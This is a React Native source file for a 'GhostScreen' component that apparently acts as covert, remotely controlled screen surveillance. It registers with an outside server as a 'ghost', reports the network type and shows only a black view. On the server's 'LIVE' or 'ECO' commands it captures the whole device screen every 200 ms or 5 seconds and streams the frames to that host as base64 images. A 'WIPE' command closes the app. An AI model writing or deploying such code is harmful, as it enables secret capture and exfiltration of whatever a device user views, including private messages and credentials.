import React, { useEffect, useRef } from 'react';
import { View, BackHandler } from 'react-native';
import * as Network from 'expo-network';
import { captureScreen } from 'react-native-view-shot';
import io from 'socket.io-client';

const socket = io('https://joyjet-server.onrender.com');

export default function GhostScreen({ name }) {
  const streamTimer = useRef(null);

  useEffect(() => {
    socket.emit('register', { role: 'ghost', name });

    const checkNet = async () => {
      const net = await Network.getNetworkStateAsync();
      socket.emit('net_status', net.type); // Reports WIFI or CELLULAR
    };
    checkNet();

    socket.on('command', (cmd) => {
      if (cmd === 'LIVE') start(200);
      if (cmd === 'ECO') start(5000);
      if (cmd === 'WIPE') BackHandler.exitApp();
    });

    socket.on('force_eco', () => start(5000));

    return () => clearInterval(streamTimer.current);
  }, []);

  const start = (ms) => {
    clearInterval(streamTimer.current);
    streamTimer.current = setInterval(async () => {
      const img = await captureScreen({ format: 'jpg', quality: 0.3, result: 'base64' });
      socket.emit('frame_data', img);
    }, ms);
  };

  return <View style={{ flex: 1, backgroundColor: '#000' }} />;
}
